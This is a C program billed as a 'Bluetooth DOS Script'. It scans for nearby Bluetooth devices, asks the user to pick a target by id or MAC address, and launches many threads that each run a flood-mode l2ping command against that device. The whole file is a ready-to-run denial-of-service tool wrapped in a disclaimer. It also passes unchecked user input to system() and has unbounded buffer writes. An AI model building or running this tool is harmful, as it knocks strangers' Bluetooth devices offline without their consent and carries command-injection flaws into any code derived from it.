#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

// Function to execute the DOS attack
void* DOS(void* arg) {
    char* target_addr = ((char**)arg)[0];
    char* package_size = ((char**)arg)[1];
    char command[100];
    snprintf(command, sizeof(command), "l2ping -i hci0 -s %s -f %s", package_size, target_addr);
    system(command);
    return NULL;
}

// Function to print the program's logo
void printLogo() {
    printf("                            Bluetooth DOS Script                            \n");
}

// Function to execute the main logic
int main() {
    printLogo();
    usleep(100000);
    printf("\n\x1b[31mTHIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.\n");
    
    char agree;
    printf("Do you agree? (y/n) > ");
    scanf(" %c", &agree);
    if (agree == 'y' || agree == 'Y') {
        usleep(100000);
        system("clear");
        printLogo();
        printf("\nScanning ...\n");
        
        FILE* fp;
        char output[1035];

        // Run the hcitool scan command and get the output
        fp = popen("hcitool scan", "r");
        if (fp == NULL) {
            printf("[!] ERROR: Failed to run command\n");
            exit(1);
        }

        int id = 0;
        char array[10][18];  // To store MAC addresses
        printf("|id   |   mac_address  |   device_name|\n");
        fgets(output, sizeof(output) - 1, fp);  // Skip the first line
        
        while (fgets(output, sizeof(output) - 1, fp) != NULL) {
            char mac[18];
            char name[100];
            sscanf(output, "%17s %s", mac, name);
            strcpy(array[id], mac);
            printf("|%d   |   %s  |   %s|\n", id, mac, name);
            id++;
        }
        pclose(fp);

        char target_addr[18];
        int target_id;
        printf("Target id or mac > ");
        scanf("%s", target_addr);

        if (target_addr[1] >= '0' && target_addr[1] <= '9') {
            target_id = atoi(target_addr);
            strcpy(target_addr, array[target_id]);
        }

        if (strlen(target_addr) < 1) {
            printf("[!] ERROR: Target addr is missing\n");
            exit(0);
        }

        int package_size;
        printf("Packages size > ");
        if (scanf("%d", &package_size) != 1) {
            printf("[!] ERROR: Packages size must be an integer\n");
            exit(0);
        }

        int threads_count;
        printf("Threads count > ");
        if (scanf("%d", &threads_count) != 1) {
            printf("[!] ERROR: Threads count must be an integer\n");
            exit(0);
        }

        printf("\n");
        system("clear");
        printf("\x1b[31m[*] Starting DOS attack in 3 seconds...\n");

        for (int i = 0; i < 3; i++) {
            printf("[*] %d\n", 3 - i);
            sleep(1);
        }

        system("clear");
        printf("[*] Building threads...\n");

        pthread_t threads[threads_count];
        char* args[2] = { target_addr, malloc(10) };
        snprintf(args[1], 10, "%d", package_size);

        for (int i = 0; i < threads_count; i++) {
            printf("[*] Built thread №%d\n", i + 1);
            pthread_create(&threads[i], NULL, DOS, args);
        }

        printf("[*] Built all threads...\n");
        printf("[*] Starting...\n");

        for (int i = 0; i < threads_count; i++) {
            pthread_join(threads[i], NULL);
        }

        free(args[1]);
    } else {
        printf("Bip bip\n");
        exit(0);
    }

    return 0;
}
